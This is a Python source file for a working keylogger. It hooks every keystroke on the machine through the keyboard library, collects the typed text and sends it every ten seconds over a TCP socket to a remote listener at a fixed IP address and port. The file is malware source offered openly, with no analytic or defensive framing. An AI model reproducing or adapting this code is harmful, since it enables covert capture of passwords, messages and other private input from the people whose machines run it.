import string
from time import sleep
import keyboard
from threading import Timer
from datetime import datetime
import socket

REPORT_PERIOD = 10 # in seconds
FILENAME = "LogReport.log"

class KeyLogger:
    def __init__(self, interval, filename, report_method="file") -> None:
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = filename
        self.timer = None
        self.connect()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while self.socket.connect_ex(('192.168.1.28', 12345)) != 0:
            print(f"Failed to connect to server")
            sleep(2)

    def __del__(self):
        self.socket.close()    

    def callback(self, event):
        name = event.name

        # replace special chars from their name to their char
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        elif name == "backspace":
            if self.log:
                self.log = self.log[:-1]
        else:
            # replace spaces with underscores
            name = name.replace(" ", "_")
            name = f"{name}"

        if name != "backspace":
            self.log += name

    def send_to_server(self):
        if self.socket:
            temp_str = f"Keyboard logger from {self.start_dt} to {self.end_dt}:\n" + self.log + "\n"
            self.socket.sendall(temp_str.encode())
            self.log = ""
        else:
            raise "Not connected to server"

    def report_to_file(self):
        '''
            Clears current report
        '''
        with open(f"{self.filename}", "a") as f:
            f.write(self.log)
            self.log = ""
        
        print(f"Report created at:{datetime.now()}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.send_to_server()
            #self.log = f"Keyboard logger from {self.start_dt} to {self.end_dt}:\n" + self.log + "\n"
            #self.report_to_file()
            self.start_dt = datetime.now()

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        print(f"Logger started at:{datetime.now()}")
        self.report()
        keyboard.wait()

klgr = KeyLogger(interval=REPORT_PERIOD, filename=FILENAME)
klgr.start()